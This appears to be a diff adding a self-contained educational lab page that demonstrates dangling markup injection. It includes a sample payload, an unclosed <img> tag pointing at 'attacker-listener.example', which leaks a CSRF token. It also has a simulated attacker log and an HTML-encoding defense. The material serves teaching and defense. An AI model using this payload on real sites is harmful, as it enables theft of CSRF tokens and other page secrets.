@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 1: Dangling Markup Injection (Guided Walkthrough)</title>
+    <style>
+        :root {
+            --primary: #0284c7;
+            --danger: #ef4444;
+            --success: #10b981;
+            --bg: #f8fafc;
+            --surface: #ffffff;
+            --border: #e2e8f0;
+            --text: #0f172a;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; line-height: 1.6; background-color: var(--bg); color: var(--text); padding: 2rem 1rem; }
+        .container { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; gap: 2rem; }
+        
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
+        .card h2 { font-size: 1.25rem; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
+        
+        .csp-banner { background: #eff6ff; border-left: 4px solid var(--primary); padding: 0.75rem 1rem; font-family: monospace; font-size: 0.85rem; margin-bottom: 1rem; }
+        
+        .form-group { margin-bottom: 1rem; }
+        label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.25rem; }
+        input[type="text"] { width: 100%; padding: 0.6rem 0.8rem; font-size: 0.95rem; border: 1px solid var(--border); border-radius: 6px; }
+        
+        .btn { padding: 0.6rem 1.2rem; font-size: 0.95rem; font-weight: 600; border-radius: 6px; border: none; cursor: pointer; transition: background 0.2s; }
+        .btn-primary { background: var(--primary); color: #fff; }
+        .btn-primary:hover { background: #0369a1; }
+        .btn-success { background: var(--success); color: #fff; }
+        
+        .code-preview { background: #0f172a; color: #f8fafc; padding: 1rem; border-radius: 6px; font-family: monospace; font-size: 0.85rem; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        .highlight-danger { color: #f87171; font-weight: bold; }
+        .highlight-secret { color: #facc15; font-weight: bold; }
+
+        .attacker-log { background: #1e1e2e; color: #a6adc8; border: 1px solid #313244; border-radius: 6px; padding: 1rem; font-family: monospace; font-size: 0.85rem; min-height: 80px; }
+    </style>
+</head>
+<body>
+
+    <main class="container">
+        <header>
+            <h1>🧪 Lab 1: Dangling Markup Injection Walkthrough</h1>
+            <p>Demonstrating sensitive CSRF token exfiltration without executing any JavaScript.</p>
+        </header>
+
+        <div class="csp-banner">
+            <strong>Active Simulated CSP:</strong> Content-Security-Policy: default-src 'self'; script-src 'none';
+            <br><em>(Notice: JavaScript execution is 100% disabled. Traditional XSS is completely impossible!)</em>
+        </div>
+
+        <!-- 1. Profile Setting: Input Injection Area -->
+        <section class="card">
+            <h2>👤 User Profile Settings (Vulnerable Input Reflection)</h2>
+            <p style="margin-bottom: 1rem; color: #64748b; font-size: 0.9rem;">
+                Enter a nickname. In vulnerable mode, the server reflects the nickname without encoding quotes!
+            </p>
+
+            <div class="form-group">
+                <label for="nickname-input">Update Nickname:</label>
+                <input type="text" id="nickname-input" value="<img src='https://attacker-listener.example/leak?data=">
+            </div>
+
+            <div style="display: flex; gap: 0.75rem;">
+                <button type="button" class="btn btn-primary" onclick="renderProfile(false)">Simulate Vulnerable Reflection</button>
+                <button type="button" class="btn btn-success" onclick="renderProfile(true)">Apply Secure Defense Patch (ENT_QUOTES)</button>
+            </div>
+        </section>
+
+        <!-- 2. Assembled Document Preview -->
+        <section class="card">
+            <h2>📄 Target HTML Document (Parsed Output)</h2>
+            <p style="color: #64748b; font-size: 0.9rem; margin-bottom: 0.5rem;">
+                Notice how the unclosed quote from the injected &lt;img&gt; tag swallows the downstream CSRF token:
+            </p>
+            <div id="html-preview" class="code-preview">Waiting for reflection...</div>
+        </section>
+
+        <!-- 3. Attacker Listener Console -->
+        <section class="card">
+            <h2>🕵️ Attacker Server Access Log (Simulated Receiver)</h2>
+            <p style="color: #64748b; font-size: 0.9rem; margin-bottom: 0.5rem;">
+                The URL query string intercepted by the attacker's HTTP server:
+            </p>
+            <div id="listener-log" class="attacker-log">[Listening for incoming GET requests...]</div>
+        </section>
+    </main>
+
+    <!-- Simulated Server-Side Processing Script -->
+    <script>
+        const SECRET_CSRF_TOKEN = "9a8b7c6d5e4f3a2b1c0d_SUPER_SECRET_CSRF_TOKEN_2026";
+
+        function renderProfile(isSecured) {
+            const rawInput = document.getElementById('nickname-input').value;
+            const logBox = document.getElementById('listener-log');
+            const previewBox = document.getElementById('html-preview');
+
+            let reflectedName = rawInput;
+
+            if (isSecured) {
+                // Defensive sanitization: htmlspecialchars with ENT_QUOTES
+                reflectedName = rawInput
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+                
+                logBox.innerHTML = `[DEFENSE ACTIVE] Input safely encoded as HTML entities.<br>No network request triggered to attacker domain!`;
+                logBox.style.color = "#10b981";
+            } else {
+                // Vulnerable behavior: Dangling quote swallows downstream HTML!
+                if (rawInput.includes("<img src='")) {
+                    const extractedSwallowedContent = rawInput + "!<input type='hidden' name='csrf' value='" + SECRET_CSRF_TOKEN + "'>";
+                    const leakUrl = rawInput.split("src='")[1];
+                    
+                    logBox.innerHTML = `<span style="color: #f87171;">[!] HTTP GET REQUEST INTERCEPTED:</span><br>` +
+                                       `GET /leak?data=!%3Cinput%20type='hidden'%20name='csrf'%20value='<span style="color: #facc15; font-weight: bold;">${SECRET_CSRF_TOKEN}</span>' HTTP/1.1<br>` +
+                                       `Host: attacker-listener.example<br>` +
+                                       `<strong style="color: #f87171;">Result: CSRF Token successfully exfiltrated without any JavaScript!</strong>`;
+                    logBox.style.color = "#a6adc8";
+                } else {
+                    logBox.innerHTML = `Normal input detected. Enter dangling payload to observe exfiltration.`;
+                }
+            }
+
+            // Render visual preview
+            previewBox.innerHTML = 
+`<!-- Server-Side Template Assembly -->
+<div class="user-greeting">
+    Welcome back, <span class="highlight-danger">${reflectedName}</span>!
+</div>
+
+<!-- Sensitive Downstream Form with Secret CSRF Token -->
+<form action="/api/account/delete" method="POST">
+    <input type="hidden" name="csrf_token" value="<span class="highlight-secret">${SECRET_CSRF_TOKEN}</span>">
+    <button type="submit">Delete Account</button>
+</form>`;
+        }
+
+        // Initialize on page load
+        renderProfile(false);
+    </script>
+</body>
+</html>
